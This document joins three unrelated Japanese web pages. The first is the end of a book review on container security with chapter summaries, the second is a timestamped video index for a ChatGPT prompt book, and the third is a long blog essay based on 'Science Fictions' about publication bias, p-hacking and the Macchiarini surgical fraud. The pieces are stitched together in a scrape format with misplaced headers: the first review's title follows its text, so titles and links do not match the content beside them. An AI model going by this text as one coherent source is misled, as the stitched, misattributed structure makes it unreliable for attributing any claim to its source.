本 Chapter に記載されているコマンドをいくつか Amazon Linux 2023 で実行してみました。Amazon Linux 2023 では「cgroup v2」がサポートされているようで、本書に記載されている実行結果とは少し異なった実行結果になります。 cgroup v2 については「3.6 cgroup v2」で解説されていますので、Amazon Linux 2023 で実験される方は先に読んでおくと良いと思います。

Chapter 4 コンテナの分離

本 Chapter では Linux カーネルの機能である namespace について詳細に解説しています。 Chapter 2～3 の Linux の機能を踏まえたうえで本 Chapter を理解すると、「コンテナは Linux カーネルの機能によってセキュリティ境界を分離された 1 プロセスである」ということが腹落ちしてくると思います。

Chapter 5 仮想マシン

Chapter 2～4 ではコンテナの詳細について掘り下げました。本 Chapter では仮想マシン（VM）の仕組みについて詳細に掘り下げて記載されています。

本 Chapter で仮想マシンの特徴を理解すると、「コンテナ間の分離」と「VM の分離」の違いやセキュリティ強度について論理的に説明できるようになるでしょう。

Chapter 6 コンテナイメージ

ここから、コンテナを使ったアーキテクチャに慣れている方にはなじみ深い内容になってくるかと思います。

コンテナイメージの構成、イメージのビルド・格納・取得に関するセキュリティについて解説しています。

Chapter 7 イメージに含まれるソフトウェアの脆弱性

コンテナイメージには多くのパッケージやライブラリが含まれています。これらの依存関係には、悪用される可能性のある脆弱性が隠れていることがあります。本 Chapter ではこれらの脆弱性を特定し、脆弱性を取り込まないための手法や取り除くためのツールを紹介しています。

Chapter 8 コンテナ分離の強化

Chapter 3～5 で「コンテナ間の分離」と「VM の分離」の違いやセキュリティ強度について理解しました。

この Chapter では、VM と比べて弱いとされるコンテナの分離強度を強めるための機能や技術について学べます。

Chapter 9 コンテナエスケープ

コンテナエスケープとは簡単に言うと「分離の無効化」です。ユーザーによってコンテナの分離が簡単に無効化できてしまうことがこの Chapter で語られます。

コンテナの分離を無効化することでサイドカーコンテナが機能していることが分かります。

Chapter 10 コンテナネットワークセキュリティ

コンテナをネットワーク的に分離する考え方が説明されています。

OSI 参照モデルや IP パケットの送信の仕組みから詳細に解説している部分もあり、ネットワーク基礎を履修済みの方はサッと読み飛ばせる章もあります。各レイヤーでどのような技術を用いてネットワークを分離しアクセス制限することができるか解説されています。

「コンテナファイアウォール」という言葉が使われていますが、実は読んでもあまりピンときませんでした。Kubernetes におけるネットワークポリシーについてはコマンド実行結果を用いて詳細に解説されています。サービスメッシュについても触れられています。

Chapter 11 TLSによるコンポーネントの安全な接続

通信の暗号化に必要な証明書の仕組みや TLS 接続の技術について解説されています。履修済みの方はサッと読めると思います。

Chapter 12 コンテナへのシークレットの受け渡し

クレデンシャルの扱いについて解説しています。望ましいシークレットの受け渡しと、セキュリティ的に危険な受け渡し方法について、その理由とともに記載されています。

Chapter 13 コンテナのランタイム保護

ランタイム保護の run-time は「実行時」の意味です。ここではコンテナ実行時に「アプリケーションが想定と異なるプロセスを実行していないか」、「想定外の通信をおこなっていないか」、「想定されたユーザー以外がアクセスしていないか」等を検知する技術について触れられています。ふるまい検知のようなイメージでよさそうです。

Chapter 14 コンテナとOWASPトップ10

OWASP は Open Web Application Security Project のことで、Web アプリケーションを取り巻く課題の解決を目指すオープンなコミュニティです。原著執筆時点の 2017 年時点のリスク Top10 を、コンテナ特有のセキュリティアプローチと関連付けて解説されています。

日本語訳時点での最新版として 2021 年版の OWASP Top 10 が発表されています。こちらも監訳補足として記載されています。

付録A セキュリティチェックリスト

コンテナデプロイメントのセキュリティを確保するために、重要な項目についてチェックリストがあります。コンテナを用いたアーキテクチャを検討または実行されている方は、このチェックリストから対策を始めてみると良さそうです。

感想

例えば AWS 環境でコンテナセキュリティを考えようと思うと、最初は以下のようなパイプラインでそれぞれセキュリテイ対策をする、というのをイメージするのではないかなと思います。少なくとも私はそうでした。

しかし本書ではいきなりこういった内容を説明するのではなく、そもそもコンテナとは、セキュリティの考え方とは、という部分から解説が始まります。上記図のような内容が始まるのは Chapter 6 以降です。

私は Windows Server を使った基幹システムの構築をずっと担当してきたので、Linux についてもそこまで詳しくなく、前半は普段意識しないコンテナの根本技術について読みながら理解するのが大変でした。本書には実際のコマンドも記載されていますので、私は EC2 を立ててその中にコンテナを起動し動作を確認しながら理解に努めました。おかげでよく言われる「コンテナの実態はプロセスである」というのがどういうことなのかようやく腹落ちしたと思います。

コンテナの本質やセキュリティに関する根本的な考え方に迫る内容が多く、すぐに現場で活用するのは難しくとも、じわじわと効いてくるような 遅効性の良書と感じました。

コンテナやセキュリティの深淵に触れてみたい方にお勧めです。本書籍が少しでも気になっている方の参考になれば幸いです。
Title: 【書評】「コンテナセキュリティ　コンテナ化されたアプリケーションを保護する要素技術」 | DevelopersIO

Link: https://note.com/currypurin/n/n18616b72e940
Content: Youtubeで配信しながら全プロンプトを実行しましたので、各節へのリンクを整理しました。時間のところにYoutubeへのリンクになっています。

もしずれていたら、その時間まで移動して視聴ください。

使用しているプロンプトはサポートサイトで公開していますので、そちらも使用してください。





1章 ChatGPTの基礎知識 (5:50)

2章 ChatGPTの基本的な使い方 (6:28)

3章 ChatGPT Plusのセットアップ (7:32)

4章 ファイルのアップロードとダウンロード (12:40)

4.1 アップロード・ダウンロード (13:03)

4.2 扱うことができるファイル (16:02)

5章 繰り返し作業を一瞬で (16:55)

5.1 文字列操作 (17:20)

5.2 正規表現でのパターンマッチ (25:36)

→54ページの正規表現でできることの例の説明 (29:09)

5.3 ファイルの一括操作 (46:20)

5.4 QRコード作成(14:41)

6.1 基本的な画像処理 (21:17)

6.2 画像生成 (30:22)

6.3 画像認識 (44:35)

6.3 画像認識 (3:31)

6.4 高度な画像処理 (19:24)

→Slack・Discordの絵文字を作る (24:16)

7章 手軽に音声ファイル処理 (34:30)

7.1 音声ファイルの読み込み (35:15)

7.2 音声ファイルの可視化 (37:10)

7.3 音声ファイルの編集 (43:02)

8章 丸投げ! PowerPoint スライド作成 (51:57)

8.1 スライドの作成 (52:03)

8.2 Webサイトを要約してスライドにする (59:50)

8.2 Webサイトを要約してスライドにする(続き、文字を大きくする) (5:55)

9章 マニュアル不要でExcel操作 (12:59)

9.1 Excelファイルの読み込みとデータの確認 (14:08)

9.2 行と列の操作 (20:30)

9.3 グラフを描く (23:37)

9.4 関数の入力 (28:05)

10章 WordファイルとPDFファイルの便利技 (40:23)

10.1 テキストデータの読み込みとWordファイルの生成 (40:25)

10.2 PDFファイルの読み込み (46:27)

10.3 PDFファイルの内容を要約する (51:34)

10.4 PDFファイルのページの結合、削除、回転 (52:57)

11章 データからかんたんグラフ作成 (57:55)

11.1 データの可視化の重要性 (1:01:29)

11.2 基本的なデータ可視化技術 (1:04:02)

11.3 さまざまな可視化技術 (1:11:28)

11.4 表形式のデータ (1:19:48)

11.5 センサデータ (1:26:39)

11.6 世界地図・日本地図へのデータの可視化 (5:05)

11.7 ワークアウトデータ (32:40)

11.8 時系列データ (39:57)

12章 データからビジネスに役立つヒントを得る (3:00)

12.1 売上データ (4:25)

12.2 X(旧 Twitter)データ (24:43)

12.3 金融データ(ビットコインの価格分析) (43:23)

13章 業務を効率化する (53:55)

13.1 Excelデータからグループ分けし、メール文を自動生成する (55:45)

13.2 Excelデータを別シートに集計し、分析結果をスライドにまとめる (1:00:18)

13.3 条件を満たしたシフト表をつくる (1:12:25)

13.4 マインドマップを自動生成する (9:30)

13.5 論文をガイドしてもらい読む (21:12)

14.1 国あてゲーム (34:33)

14.2 推理ゲーム (39:30)

15.1 時計アプリケーション (44:12)

15.2 ポモドーロアプリ (50:36)

16.1 ChatGPTにPythonを教えてもらう (1:01:55)

16.2 コードをアップし解説・実行をしてもらう (7:10)

16.3 コードを改善してもらう (14:56)

17.1 GPTsで自分専用のGPTを作る (23:20)

17.2 無料で使えるPython実行環境:Google Colaboratory (40:46)

17.3 X(旧 Twitter)データの分析の準備 (56:55)

17.4 X(旧 Twitter)データからワードクラウドを作る (1:04:28)

17.5 類似ポストを検索するGPTを作る (1:11:23)
Title: 「面倒なことはChatGPTにやらせよう」の全プロンプトを実行した配信のリンクを整理しました｜カレーちゃん

Link: https://note.com/fromdusktildawn/n/n9171321c379c
Content: 科学的発見が私たちに届くまでの伝言ゲームで、さまざまな誇張・曲解・誤解が注入されています。

いったい、どうやったら、この伝言ゲームに勝ち、信用できる科学的発見と、地雷とを見分けることができるのでしょうか？

『Science Fictions』という本がその参考になります。

この本は、アメリカのamazonで306人に評価され、☆4.6という高評価。

世界最大の書評サイトgoodreadsでは1925人に評価され、☆4.39という高評価。

日本のamazonでは31人に評価され、☆4.0と、中程度の評価(翻訳は良い)です。

この記事では、この本を元に、以下の２つの視点から、この問題と、その解決策を検討します。

〔問題の把握〕 科学的発見の流通システムにおいて、いかにして、発見が誇張され、曲解され、誤解され、流通し、最終的に私たち一般人がそれを信じてしまうのか、その全体像を把握する。

〔解決策〕 インチキな「科学的発見」に騙されにくくする、誰でも簡単に実行できる、効果抜群の２つの対策をやる。



こまけぇこたぁいいんだよ！！ 答えだけ教えろ。 10秒で教えろ。

という方は、「一般人がやるべき対策」という章の末尾の「まとめ」というセクションだけお読みいただければ。

(目印にやる夫画像を貼っておきます)



「なぜ、その答えになるのか？」を知りたい方のために、以下、解説します。

















効果量

最初に「効果量」について説明します。





「成長マインドセット」の研究をご存じでしょうか？

スタンフォード大学教授キャロル・ドゥエックによれば、マインドセット(思考態度)には以下の二種類があります。

〔成長マインドセット(growth mindset)〕 人間の基本的資質は努力次第で伸ばすことができると思っている。

〔固定マインドセット(fixed mindset)〕 人間の基本的資質は生まれつき決まっていて変わらないと思ってる。

どちらのマインドセットを持つかによって人生が劇的に違ってくる、というのが、彼女の主張です。

20年にわたる研究の結果、それが分かったと言うのです。

彼女は、それを一般人向けの本に書き、"Mindset: The New Psychology of Success"(邦訳：『マインドセット：「やればできる！」の研究』)という本として2007年に出版し、世界的なベストセラーになりました。

アメリカのamazonでは2万1138人に評価され、☆4.6という高評価。

書評サイトgoodreadsでは14万8152人に評価され、☆4.09という高評価。

日本のamazonでも1948人に評価され、☆4.3という高評価です。

以下、この本からから引用します。

本書を読まれれば、自分についてのある単純な信念---私たちの研究で発見された信念---が人生をどれほど大きく左右しているかがおわかりになるだろう。

その信念は、人生のありとあらゆる部分にまで浸透している。

自分の性格だと思っているものの多くが、じつはこの心のあり方(=mindset)の産物なのである。

あなたがもし可能性を発揮できずにいるとしたら、その原因の多くは"マインドセット"にあると言ってよい。

(太字改行引用者) キャロル・S・ドゥエック (著), 今西 康子 (翻訳)『マインドセット：「やればできる！」の研究』



彼女の成長マインドセットのTED の再生回数は１５４６万回、

YouTube は５７５万回です。



彼女のこの理論は、教育界でも強い支持を広く集めています。

マインドセットの概念は教育界で熱狂を巻き起こした。

2016年にアメリカの教師を対象におこなわれた調査では、57%の人が成長マインドセットの原則に関するトレーニングを受けたことがあり、98%が成長マインドセットの考え方を教室で実践すれば生徒の学習が向上すると答えている。

イギリスでも数千の学校が公式サイトで、成長マインドセットの方針を掲げている。

(改行引用者) スチュアート・リッチー (著), 矢羽野 薫 (翻訳)『Science Fictions』

これは、この理論が、教育現場において実践しやすいことも理由の一つかも知れません。

ドゥエック教授は、

「わあ、○点も取ったの、いい点ね。あなたは頭がいいわ」と「能力」褒めれば固定マインドセットを持つようになり、

「わあ、○点も取ったの、いい点ね。よく頑張ったわ」と「努力」を褒めれば成長マインドセットを持つようになる、

と言うのですから。

では、この手の話に手厳しいことで有名なはてなブックマークはどうでしょうか？

この本の内容を紹介したGigazineの記事には1377のブックマークがつき、それについたコメントの多くは肯定的で、この研究結果自体を懐疑しているコメントはごくわずかです。

これだけ多くの人々に絶賛される理論ですから、アメリカとイギリスだけでなく、他の国でも効果があるに違いありません。

そこで、中国の9～13歳の子供624人を被験者にして、成長マインドセットの検証実験( Li,Y.,& Bates, T.C., Ph.D. 2017年)が行われました。

しかし、どちらのマインドセットを持つかによって、IQにも学業成績にも違いは出ませんでした。

中国人が特殊な文化を持っているためでしょうか？

それとも、624人では、被験者数が少なすぎて、この効果を統計的に検出できないのでしょうか？

では、チェコ共和国の大学生5653人を被験者にして行われた実験( Bahnik, Stepan, and Marek A. Vranka 2017年)はどうでしょうか。

実は、その研究でも、成長マインドセットと固定マインドセットの違いは検出できませんでした。

大学生だからダメなのでしょうか？

もっと幼いうちでないと、効果がないのでしょうか？

ところが、イギリスの6歳の生徒4584人を被験者にしたFoliano, F., Rolfe, H., Buzzeo, J., Runge, J., & Wilkinson, D.の2019年の研究でも、やはり、効果は検出できなかったのです。

アメリカの大学の数学と心理学の学生2607人を被験者にしたCaitlin Brez, Eric M. Hampton, Linda Behrendt, Liz Brown & Josh Powersの2020年の研究でも、効果は検出できませんでした。

これほど多くの被験者でも検出できないなんて、本当に、そんな効果は存在するのでしょうか？

成長マインドセットは、ドゥエック教授のでっち上げではないのでしょうか？

ところが、そうでもないのです。

メタアナリシスとは、過去に報告された複数の研究結果を統合するための統計解析のことです。

個別の実験としては信頼性が最高レベルのランダム化比較試験と比べても、メタアナリシスはさらにエビデンスレベルが高く、信頼性が高いとされています。

つまり、効果は、たしかに存在するのです。

ただ、効果が微弱なため、実験条件によって、被験者によって、ノイズによって、効果を検出できたり、できなかったりするのです。

メンタリストDaiGo氏の『超効率勉強法』という本では、ドゥエック教授の「成長マインドセット」を激推ししていて、かなりのページ数を割いて解説しています。

DaiGo氏は、チャンネル登録者数226万人のYouTuberで、科学的根拠のある話をすることをウリにしている方です。

以下、『超効率勉強法』から引用します。

これを読んだ人は、「成長マインドセット」にはものすごい効果があると思ってしまいそうですが、実際には、微妙な実験条件の違いで効果が検出できたりできなかったりする、不安定で微弱な効果しかありません。

つまり、効果が誇張されているのです。

この本は、どれくらいの人が買っているのでしょうか？

なんと発行部数20万部。

ものすごく売れてます。

Amazonレビューでの評価はどうでしょうか？

なんと1441人に評価され、☆4.3の高評価です。

以下、この本についたAmazonレビューコメントをいくつか引用します。

「科学的に証明されている」勉強法が詰まっていて、学習する上では必須の知識、応用方法が凝縮されています。 ( https://www.amazon.co.jp/gp/customer-reviews/R1B3YFSJFZE7C0/ より引用)





実験や研究をもとにした内容ですので「なるほど」です。 ( https://www.amazon.co.jp/gp/customer-reviews/R3TXGU1Z3F62H0/ より引用)





ちまたでは、科学的に間違った学習法でも、

「売れている」

本はいくつもあるので、注意しなければならないが、

この本は、「売れて」いてなおかつ「正しい」勉強法の本である。 ( https://www.amazon.co.jp/gp/customer-reviews/R3VF4QXQHX0161/ より引用)





成功者が書いているので説得力が違います。子供にも教えたいと思います。 ( https://www.amazon.co.jp/gp/customer-reviews/RANHVE5PWAF10/ より引用)





こうして、微弱な効果が発見され、それが誇張されて本に書かれ、それを誇張したスピーチがTEDで行われ、それをYouTuberやブロガーがさらに誇張し、Amazonレビューに絶賛コメントが多数付き、我々一般人の多くが絶賛するというわけです。













「メタアナリシスだから信用できる」は本当か？



メタアナリシスの結果、成長マインドセットには微弱な効果があることが判明しました。

しかし、そもそも、「メタアナリシスだから信用できる」と言っていいのでしょうか？

それを確認するため、「ロマンチック・プライミング」のメタアナリシスを見てみましょう。

これは、「魅力的な女性の写真を見せられた男性は、より多くのリスクを冒し、消費財に金をかける(パートナーを惹きつけるために「目につく消費」をする)」という仮説です。

心理学者のデイビッド・シャンクスらは、そのメタアナリシスを行いました(2015年) 。

すると、これについて15本の論文が見つかり、43の実験について記されていることが分かり、仮説が裏付けられたかのように見えました。

メタアナリシスという望遠鏡によって、銀河が見えたのです。

ところが、シャンクスたちが大規模な実験でロマンチック・プライミングを再現しようとしたところ、再現された効果はすべてゼロ付近に集まりました。

銀河は見えなかったのです。

大規模な実験というのは、大型望遠鏡です。

はるか遠くの銀河まで、鮮明に見えるはずです。

なのに、そこにあるはずの銀河が、見えなかったのです。

いったい、なぜ、大規模実験の結果とメタアナリシスの結果が矛盾したのでしょうか？

メタアナリシスにおいて、サンプル数(被験者数)を縦軸、検出された効果の大きさを横軸にした図に、各論文の実験結果をプロットしていくと、理論上は、以下のようになるはずです。

(『Science Fictions』より引用)

なぜなら、サンプル数が小さい実験ほどノイズが入りやすいので、検出された効果にばらつきがでるからです。

逆に、サンプル数が大きくなれば、ノイズが除去されるので、検出される効果の大きさにばらつきがなくなるはずです。

ところが、実際には、この図のようなきれいなファンネルにならないことがよくあります。

なぜかというと、「効果が検出されなかった」という論文(NULL論文と呼ばれる)を学術誌に掲載してもらおうとすると、拒否されることが多いからです。

また、NULL論文は、研究者の業績としても評価されにくいので、NULLの結果が出たら、それを、そもそも論文に書かない研究者が多いからです。

その結果、下図のようになることが多いのです。

(『Science Fictions』より引用)

これを、出版バイアスと呼びます。

これによってメタアナリシスのレンズが歪んでしまい、存在しない銀河が、メタアナリシス望遠鏡のレンズに映ってしまうというわけです。

実は、さきほどのシャンクスらのメタアナリシスにおいても、出版バイアスがないか調べてみたところ、NULL論文があるはずのところから、ごっそり論文が抜けていることが分かりました。

分かりやすいように、シャンクスらの行ったメタアナリシスを雑なイメージ図で説明します。

NULL論文も全て出版されていれば、理論上は、以下のようになっていたはずです。

つまり、サンプル数(被験者数)が大きい実験ほど検出される効果はゼロに近づきます。

また、サンプル数が小さい実験はノイズが混じるので、効果はマイナスとプラスに同じように散らばるのです。

しかし、NULL論文が出版されにくいことにより、実際には、下図のようになってしまったというわけです。

このため、仮説を支持する論文が多数派になり、ありもしない銀河が見えてしまったというわけです。

そういうわけで、メタアナリシスが信用できるかどうかは、そのメタアナリシスが、出版バイアスをどの程度考慮して補正しているかに依存します。

「メタアナリシスだから信用できる」とは、一概には言えないのです。









ありもしない効果が検出されるプロセス



この章では、双六(すごろく)の「データ分析」のところを解説します。



出版バイアスさえなければ、実験結果は信頼できるのでしょうか？



一般に、p値が0.05未満だと、統計的に有意だと見なすことが多いです。

実は、「p値が0.05未満だと、統計的に有意」になるのは、あくまで、一種類の統計検定だけをやることが前提の話です。

統計検定Aではp値が5%未満にならなかったので、統計検定Bを試し、それでもダメだったからCを試し……をくり返し、ついに、Gで4.8%になったとします。

この場合、前提条件が崩れてしまっています。

サイコロを何度も振っているからです。

さらに、被験者全部のデータを使うと、どういう統計分析をやっても有意にならなかったとします。

そこで、「この効果が出るのは、身長が低いor高い人に限られるのかもしれない」と考え、被験者を身長170センチ以上と未満に分割して分析したとします。

その結果、身長170センチ未満の被験者だけで分析すると、p値が0.045になることが分かったとします。

この場合も、前提が崩れています。

サイコロを振った回数が多くなっているからです。

ここで、それでもまだ、統計的に有意にならなかった場合を考えます。

その場合、被験者の中に、データを大きくゆがめている人がいないか、調べます。

すると、被験者の中に、仮説とは逆の振る舞いをする人がいて、それがデータを大きくゆがめていることが分かりました。

その被験者を除外すれば、統計的に有意になります。

そこで、実験者は、「その被験者を除外する正当な理由」を、一生懸命考え出します。

たとえば、その被験者は、実験当時、体調が悪かった、とかなんとか。

そして、その被験者を除外して、データを分析し直すと、p値が0.041になったとします。

しかし、こういうことをやっていれば、当然、前提は崩れています。

やっぱり、サイコロを振る回数が増えているからです。

実は、こういうp-hackingやHARKingと呼ばれるインチキ行為は、広く行われていると考えられています。

以下、『Science Fictions』から引用します。

ワンシンクは自分のフログの投稿で、ニューヨークのピザレストランで収集したデータセットを分析するように大学院生に勧めたことを書いた。

彼は大学院生に、最初に立てた仮説は「失敗」したが、仮説を支持しない結果を論文として発表したり、すべてをお蔵入りにしたりするのではなく、「(データセットを)救済する手が何かあるはずだ」と伝えた。

彼女はそれに応えて、「毎日のよう に……不可解な新しい結果を持ってきて……毎日のように……データを再分析する別の方法を思いついた」。

ワンシンクは、自分のデータセットをさらって何かしら「重要なもの」を探していたことを率直に認めたことによって、自分だけでなく残念ながら大勢の科学者が研究をおこなう方法に大きな欠陥があることを、意図せず明らかにした。 『Science Fictions』から引用



こうして、科学者の「データ分析」の「努力」が実って、ありもしない効果が検出され、その科学的発見をYouTuberとブロガーが大げさに喧伝し、それを一般の方々が絶賛することになったりするわけです。













論文検索はどのくらい信用できるか？

「成長マインドセット」でググると、「成長マインドセットは教育や人材育成のカギを握る重要なものだ」という主張ばかりが目につきます。

検索結果をいくらスクロールしても、再現実験に失敗したとか、その効果が微弱であるという記事は、なかなか見つかりません。

普通の検索エンジンの結果を鵜呑みにすると、とんでもない勘違いをしてしまいそうです。

そこで、Googleスカラーなどの、論文検索エンジンを使います。

ところが、論文検索をやると、ターゲットとする効果が検出されたという論文の方が多く引っかかり、NULL論文は少ししかひっかかりません。

これも、出版バイアスです。

学術誌も大学もNULL論文を好まないために、検索結果が歪んでしまっているのです。

「論文検索して出てきた関連論文を片端から全部読んだが、効果が証明されたという論文がほとんどだったから大丈夫だろう」

などと考えると、「ロマンチック・プライミング」のような、とんでもない勘違いをすることになります。

このため、論文を大量に読んで自説に自信を持ったYouTuber/ブロガーが、それを根拠に自説を記事/動画で語り、それを人々が絶賛することになるというわけです。













超一流の学術誌なら信用できるか？



しかし、ネイチャーやサイエンスのような、超一流の学術誌に掲載された論文なら信用できるのではないでしょうか？

一流の学術誌は、一流の科学者たちに査読された一流の論文しか掲載しないはずだからです。

「査読(さどく)」とは、その学問分野の専門家が読んで、内容の評価を行うことです。

科学的発見の信頼性を議論する上で、「学術誌」と「査読」はキモとなるところなので、ここは、少し詳しめに見ましょう。

それらを理解するための良い例が『Science Fictions』で紹介されていたので、少し長くなりますが、説明します。

2008年、医療系で最も権威ある学術誌の一つ『ランセット』に一本の論文が掲載されました。

これは、イタリアの外科医パオロ・マッキャリーニによる論文で、「気管の移植に成功した」というものです。

この論文を機に、マッキャリーニは天才外科医として評判が高まり、2010年にはスウェーデンのカロリンスカ研究所(カロリンスカ医科大学)に教授14人の推薦を受けて客員教授として迎えられ、付属のカロリンスカ病院の主任外科医に就きました。

カロリンスカ研究所は優れた大学がそろうスウェーデンでトップクラスというだけでなく、ノーベル医学・生理学賞の選考委員会が置かれています。

マッキャリーニは次々と手術を成功させ、2011年には2本目の論文も『ランセット』に掲載されました。

サンクトペテルブルク出身のバレエダンサー、ユリア・トゥーリクさんは健康でしたが、この「天才外科医」マッキャリーニの画期的な手術を受けることにしました。

交通事故の影響で、気管に穴が開いており、話すときには穴を自分の手で塞がなければならなかったからです。

彼女は、息子に歌を歌ってやるために手術を受けることにしたのです。

この手術を受けてしばらく後、彼女はジャーナリストのインタビューに対して、以下のように語ったということです。

何もかも、すべてが最悪です。

クラスノダールの病院に入院して半年あまり。

全身麻酔で30回以上、手術を受けました。

最初の手術の3週間後に化膿した瘻孔〔膿が漏れる穴〕が開き、その後、首が腐ってしまいました。

体重は47キロ。

歩くのもやっとです。

息をするだけで苦しくて、今では声も出ません。

そして、あまりにも強烈な臭いがして……人々が後ずさりします。

(改行引用者) (『Science Fictions』より引用)

彼女は最初の手術から2年後の2014年に死亡しました。

彼女の手術は、たまたま運悪く失敗したのでしょうか？

実は、マッキャリーニがこの手術をした患者は、みな、同じような状況でした。

以下、『Science Fictions』から引用します。

カロリンスカ病院でマッキャリーニの患者を術後に担当した医師たちは、目の前の患者の悲惨な状態と、科学論文で報告され称賛されている結果が、どうしても一致しなかった。

彼らはカロリンスカ研究所の所長に不満を訴えた。

ところが、研究所からは驚きや懸念が返ってくるどころか、申し立ては相手にされず、口止めさえされたのだ。

さらに、患者のカルテを見てプライバシーを侵害したとして警察に通報された(この告発はすぐに取り下げられた)。

最終的に、研究所の上層部は医師たちの強い訴えを無視できなくなり、近くにあるウプサラ大学の教授を独立した研究者として迎え調査を始めた。

2015年5月に発表された長文の報告書は、これ以上ないほど明確だった。

マツキャリーニは複数の「科学的不正行為の罪」をおかしていた。

彼の7本の論文で、必要な検査をしていないにもかかわらず患者の状態が改善したと偽る、患者がより長く健康だったように見せるために追跡期間を偽って記載する、患者が重度の合併症になったことや追加の手術を受けなければならなかったことを報告しない、人間を対象とする医学的実験をおこなうための倫理的な許可を正しく得ていない、ラットの気管を置換する実験でデータを改ざんする、などの行為が認められた。

ただし、これで終わりではなかった。

独立調査機関が指摘した疑いについてマッキャリーニが説明に応じた後、カロリンスカ研究所は独自の内部調査をすると決めた。

そして2015年8月、非公開の情報をもとに、実際は不正行為はなかったと結論づけたのだ。

その翌週に『ランセット』は、「パオロ・マッキャリーニは科学的不正行為の罪をおかしていない」と祝福した。

マッキャリーニの容疑は晴れた----医学界で最も権威ある2つの機関が「潔白」を証明したのだ。

(太字改行引用者) 『Science Fictions』から引用

その後もいろいろあって、結局、さらなる調査が行われ、真実が誰の目にも明らかになったわけですが、最終的にマッキャリーニが解任されたのは2016年3月、最初に失敗した人工気管移植手術から7年も経った後のことでした。

双六で言うと、「実験」にあたる部分に、そもそも問題があったわけです。

なぜ、超一流の学術誌が、こんなインチキ論文を掲載したのでしょうか？

なぜ、査読を行った一流の医学者たちは、マッキャリーニのインチキを見抜けなかったのでしょうか？

実は、ほとんどの場合、査読を行う専門家たちには、詳しいデータは公開されていないのです。

これは、医療系の学術誌に限った話ではなく、ほとんど全ての学術誌がそうなのです。

査読者は、税務署の職員が税務調査をするように実験や手術の詳細を調べたりはしません。

彼等は、マッキャリーニが自己申告したことは全て事実だという前提で、査読を行ったのです。

以下、『Science Fictions』より引用します。

査読者は、基本的に結果の解釈について懐疑的だが、データが偽物かもしれないという考えがすぐに浮かぶことはない。 『Science Fictions』より引用

また、査読者の人選自体がハックされることもあります。

以下、『Science Fictions』より引用します。

たとえば、科学者が学術誌に論文を投稿する際に、査読者を自ら推薦できるという意外な事実がある。

詐欺師はこれを利用する。

推薦された査読者に論文を送るか、あるいは編集者が選んだ査読者に送るかは編集者の自由だが、たいてい前者になる。

著者が査読者を推薦するというそもそもの意図は、多忙な編集者が論文に関連のある適切な専門家を探す負担を軽くするためだ。

この仕組みは、言うまでもなく、悪用にうってつけだ。

著者が友人や同僚を査読者として推薦すれば、出版までの道のりが楽になる。

それだけでも十分に問題だが、不正行為は簡単にエスカレートする。

ある編集者は、生物学者のムン・ヒュインのケースを紹介している。

『〔ムンは〕好ましい査読者を推薦していた……〔彼らは〕偽の名前と身元やアカウントを使った、彼自身や同僚だった。

実在する人物の名前もいくつかあったが(ネットで検索すればわかる)、自分や同僚が管理できるメールアドレスを勝手に作成し、自分で査読してコメントを記していた。

偽名でメールアドレスを作成しただけの場合もあった。

これらの査読者が提出したコメントは、ほぼすべてが好意的だったが、論文を改善するための提案もあった。』

(改行引用者) 『Science Fictions』より引用

査読の不正をしたのは、もちろん、ムンだけではありません。

これも本書から引用します。

2016年に大手科学出版社のシュプリンガーは、自社の『トウモア・バイオロジー』誌で査読の不正が横行していることに深く絶望し、わずか4年分のバツクナンバーから汚染された論文107本を撤回した後、この学術誌の発行をあきらめて別の会社に売却した。 『Science Fictions』より引用

マッキャリーニ事件に話を戻します。

いつもの双六(すごろく)で整理すると、「実験」自体に問題があり、「論文」がねつ造され、それを「査読」が通過させてしまい、「学術誌」がそれを掲載してしまったために、インチキな事実が「メディア報道」され、それを一般人が信じてしまい、健康だったバレエダンサーのユリア・トゥーリクさんも信じてしまい、首が腐ってお亡くなりになられた、ということになります。



マッキャリーニの論文は、例外でしょうか？

もちろん、ここまで酷いインチキは、例外的です。

しかし、これほど大きなインチキが一流の専門家による査読を通過し、一流の学術誌に二度も掲載されてしまったという事実には意味があります。

なぜなら、もっと小さくて分かりにくい微妙なインチキの多くは、査読においても気づかれにくく、通過してしまっていると考えられているからです。

たとえば、統計的に有意な結果にならなかったために、さまざまな統計検定を試し、それでやっと統計的に有意になるパターンを見つけたとします。

そうやって見つけた統計的有意性には、統計的な妥当性はありません。

そこで、研究者は、はじめからその統計検定だけを行うつもりだったかのように論文を書くのです。

つまり論文にウソを書くのです。

こういうインチキをやっても、統計分析の過程が自己申告であるため、バレにくいです。

また、それでも統計的に有意にならなかったので、被験者を身長170センチ未満と以上に分割して、それぞれ統計検定を行って、170センチ未満の被験者でだけ統計的に有意になったとします。

その場合、はじめから170センチ未満の人で有意な結果がでるだろうと仮説を立てていたかのように、論文にウソを書いても、なかなかバレません。

都合の悪いサンプルを、もっともらしい理由をつけて除外するのも、同様です。

はじめからそういう方針で実験計画を立てていたかのように論文を書いてしまえば、バレにくいのです。









論文のアブストラクト(要約/概要)は信用できるか？

科学的根拠がある話をすることがウリのYouTuberが、別のYouTuberとネットバトルをしているとき、「主張の根拠が論文に書かれているかどうか」が議論の焦点になっていたことがあります。

私はそのバトルを観察していたのですが、興味深かったのは、彼等は論文の本文は読まず、アブストラクト(要約/概要)だけ読んで論争していたということです。

アブストラクトとは、論文の冒頭に書かれている要約/概要で、そこは無料で読めます。

しかも、非常に短いので、すぐに読めます。

Web小説の投稿サイトの場合、小説の「概要」ページには、小説の結末までは書いてません。ネタバレになってしまうからです。

これに対し、論文の「アブストラクト」には、論文の結論まで書いてあります。ネタバレしてるのです。

ということは、論文の結論だけ知りたい人は、アブストラクトだけ読めば十分？

ところが、論文のアブストラクトには「スピン」と呼ばれる粉飾や誇張に近い表現が含まれていることが多いのです。

以下、『Science Fictions』から引用します。

2010年のある分析では、NULLの結果になったランダム化臨床試験(試験対象の治療法とプラセボで差がなかった臨床試験)の代表的なサンプルについて、スピン(ここでは、ポジティブな発見がないことから読者の注意をそらすために使われている表現を指す)がどの程度含まれているかを調べた。

その結果、論文のアブストラクトの68%および本文の61%に、臨床試験で失敗したにもかかわらず、その治療法の利点を強調しようとする部分があった。

また、論文の20%はすべてのセクション(イントロダクション/序論、メソッド/手法、リザルツ/結果、ディスカッション/考察)に少なくとも1つのスピンがあり、18%はタイトルにもスピンが含まれていた。

(改行引用者) 『Science Fictions』から引用

アブストラクトの誇大表現は、NULL論文に限った話ではありません。

Christiaan H.らが2015年に行ったアブストラクトの分析も、本書では紹介しています。

この分析(引用者注：Christiaan H.らが2015年に行った分析)は特定の用語を含むアブストラクトの割合を年別にグラフ化している。

